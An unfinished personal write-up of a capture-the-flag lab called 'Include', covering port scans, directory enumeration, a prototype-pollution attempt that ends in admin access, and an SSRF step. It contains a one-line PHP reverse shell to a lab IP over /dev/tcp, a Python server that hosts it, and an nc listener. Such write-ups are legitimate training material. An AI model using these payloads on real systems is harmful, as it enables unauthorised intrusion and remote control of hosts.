#medium 

## 0. **Lab infos**

**Difficulty :** Medium
**Name :** Include
**IP** : 10.10.102.230
**Objectives :** Get the flag value after logging in to the SysMon app and find the content of the hidden text file in /var/www/html
**OS :** ?

##### **Conclusion**
**Time :** 
	**Start :** 17.03.2025 | 18:38
	**Break at/to :** 17.03.2025 | 19:31
	**Finish :** 
**Satisfaction :**  
### 1. **Reconnaissance

With #nmap :

```BASH
nmap -p- -A -v 10.10.102.230
```


Output :

```BASH
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
25/tcp    open  smtp     Postfix smtpd
|_smtp-commands: mail.filepath.lab, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Issuer: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T16:53:34
| Not valid after:  2031-11-08T16:53:34
| MD5:   05c8 4559 9811 a54f 9c53 b3ee f6ad f0fd
|_SHA-1: a24d 7a7f 9ac1 8045 5c5f 5b7c 721a 4e21 0599 ed7c
|_ssl-date: TLS randomness does not represent time
110/tcp   open  pop3     Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE UIDL CAPA STLS TOP RESP-CODES PIPELINING SASL
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Issuer: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T16:53:34
| Not valid after:  2031-11-08T16:53:34
| MD5:   05c8 4559 9811 a54f 9c53 b3ee f6ad f0fd
|_SHA-1: a24d 7a7f 9ac1 8045 5c5f 5b7c 721a 4e21 0599 ed7c
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: ENABLE STARTTLS SASL-IR IDLE post-login LOGINDISABLEDA0001 listed IMAP4rev1 have Pre-login OK ID capabilities more LOGIN-REFERRALS LITERAL+
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Issuer: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T16:53:34
| Not valid after:  2031-11-08T16:53:34
| MD5:   05c8 4559 9811 a54f 9c53 b3ee f6ad f0fd
|_SHA-1: a24d 7a7f 9ac1 8045 5c5f 5b7c 721a 4e21 0599 ed7c
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: ENABLE AUTH=PLAIN Pre-login IDLE post-login listed SASL-IR IMAP4rev1 have AUTH=LOGINA0001 OK ID capabilities more LOGIN-REFERRALS LITERAL+
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Issuer: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T16:53:34
| Not valid after:  2031-11-08T16:53:34
| MD5:   05c8 4559 9811 a54f 9c53 b3ee f6ad f0fd
|_SHA-1: a24d 7a7f 9ac1 8045 5c5f 5b7c 721a 4e21 0599 ed7c
995/tcp   open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE UIDL CAPA TOP USER RESP-CODES PIPELINING SASL(PLAIN LOGIN)
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Issuer: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T16:53:34
| Not valid after:  2031-11-08T16:53:34
| MD5:   05c8 4559 9811 a54f 9c53 b3ee f6ad f0fd
|_SHA-1: a24d 7a7f 9ac1 8045 5c5f 5b7c 721a 4e21 0599 ed7c
4000/tcp  open  http     Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Sign In
50000/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: System Monitoring Portal
```

We have many ports :

```PORTS
- 22 --> ssh
- 25 --> smtp
- 110 --> pop3
- 143 --> imap
- 993 --> ssl/imap
- 995 --> ssl/pop3
- 4000 --> http (Node.js)
- 50000 --> http (Apache httpd)
```

First of all we gonna check the http ports.


`Port 4000` :

![[Pasted image 20250317184454.png]]


`Port 50000` :

![[Pasted image 20250317184547.png]]


Now, with #gobuster we search for some pages.

`Port 4000` :

```BASH
root@ip-10-10-196-9:~# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.102.230:4000 -x php,html,htm,js,txt,log,conf,config
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.102.230:4000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,log,conf,config,php,html,htm,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 302) [Size: 29] [--> /signin]
/images               (Status: 301) [Size: 179] [--> /images/]
/signup               (Status: 500) [Size: 1246]
/Index                (Status: 302) [Size: 29] [--> /signin]
/signin               (Status: 200) [Size: 1295]
/fonts                (Status: 301) [Size: 177] [--> /fonts/]
/INDEX                (Status: 302) [Size: 29] [--> /signin]
/Signup               (Status: 500) [Size: 1246]
/SignUp               (Status: 500) [Size: 1246]
/signUp               (Status: 500) [Size: 1246]
/SignIn               (Status: 200) [Size: 1295]
Progress: 246166 / 1964484 (12.53%)
```


`Port 50000` :

```BASH
root@ip-10-10-196-9:~# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.102.230:50000 -x php,html,htm,js,txt,log,conf,config
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.102.230:50000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              config,php,html,htm,js,txt,log,conf
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 281]
/.htm                 (Status: 403) [Size: 281]
/.php                 (Status: 403) [Size: 281]
/index.php            (Status: 200) [Size: 1611]
/login.php            (Status: 200) [Size: 2044]
/templates            (Status: 301) [Size: 327] [--> http://10.10.102.230:50000/templates/]
/profile.php          (Status: 302) [Size: 0] [--> login.php]
/uploads              (Status: 301) [Size: 325] [--> http://10.10.102.230:50000/uploads/]
/api.php              (Status: 500) [Size: 0]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/auth.php             (Status: 200) [Size: 0]
/dashboard.php        (Status: 302) [Size: 1225] [--> login.php]
/phpmyadmin           (Status: 403) [Size: 281]
Progress: 615082 / 1964484 (31.31%)
```

It's look like we have nothing interesting here.

On the port 4000 we can logging with the `guest:guest`

![[Pasted image 20250317190733.png]]

We can probabely make a #PrototypePollution

## 2. **Weaponization

For the port 4000  we want to make a #PrototypePollution with the vallue `isAdmin: false`

```javascript
{ "__proto__": { "isAdmin": true } } 
```

We make a reverse shell in shell.php

```PHP
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.196.9/4444 0>&1'"); ?>
```

We make a server with python 

```python
python3 -m http.server 1234
```
## 3. **Delivery

## 4. **Exploitation

The #PrototypePollution doesn't work but :

![[Pasted image 20250317191657.png]]

Whene we Enter the value :
isAdmin and true for the value,  the system make a write-up. So now we are admin.

On the API page we have this :

```API
 Internal API

GET http://127.0.0.1:5000/internal-api HTTP/1.1
Host: 127.0.0.1:5000

Response:
{
  "secretKey": "superSecretKey123",
  "confidentialInfo": "This is very confidential."
}

Get Admins API

GET http://127.0.0.1:5000/getAllAdmins101099991 HTTP/1.1
Host: 127.0.0.1:5000

Response:
{
    "ReviewAppUsername": "admin",
    "ReviewAppPassword": "xxxxxx",
    "SysMonAppUsername": "administrator",
    "SysMonAppPassword": "xxxxxxxxx",
}
```


## 5. **Installation

On the admin setting of the port 4000 we change the Banner Image to 

`http://10.10.196.9:1234/shell.php`

Now we listening on the 4444 port

`nc -lvnp 4444`

Adn we go to the banner image.

## 6. **Command and Control

## 7. **Actions on Objectives

